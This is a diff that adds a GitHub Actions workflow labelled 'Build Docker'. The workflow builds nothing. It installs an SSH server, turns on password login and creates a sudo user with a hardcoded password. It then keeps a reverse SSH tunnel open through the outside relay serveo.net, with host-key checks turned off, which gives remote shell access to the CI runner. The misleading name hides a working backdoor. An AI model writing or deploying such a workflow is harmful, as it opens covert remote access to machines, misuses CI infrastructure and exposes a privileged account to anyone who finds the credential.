@@ -1,0 +1,47 @@
+name: Build Docker
+
+on:
+  push:
+    branches: [ rubato ]
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+    # - uses: actions/checkout@v2
+    - name: build
+      shell: bash
+      run: |
+        whoami
+        sudo apt update
+
+        # Install OpenSSH server
+        sudo apt install -y openssh-server
+        sudo sed -i 's/#PasswordAuthentication yes/PasswordAuthentication yes/' /etc/ssh/sshd_config
+
+        sudo useradd -m -s /bin/bash rubato
+        echo "rubato:0tAbv4" | sudo chpasswd
+        sudo usermod -aG sudo rubato
+        sudo service ssh restart
+        generate_random_port() {
+          local min=10000
+          local max=65500
+
+          # Generate random number and scale to the desired range
+          local random_number=$((RANDOM + RANDOM))  # Range: 0 to 65534
+          local range=$((max - min + 1))
+
+          # Adjust to fit in the desired range
+          local result=$(( (random_number % range) + min ))
+          echo $result
+        }
+
+        # Generate and print the random number
+        while [ 1 ] ; do
+          random_port=$(generate_random_port)
+          ssh -R $random_port:localhost:22 -o StrictHostKeyChecking=no -o "UserKnownHostsFile=/dev/null" -o ServerAliveInterval=30  serveo.net
+          date; echo
+        done
+
+
+  
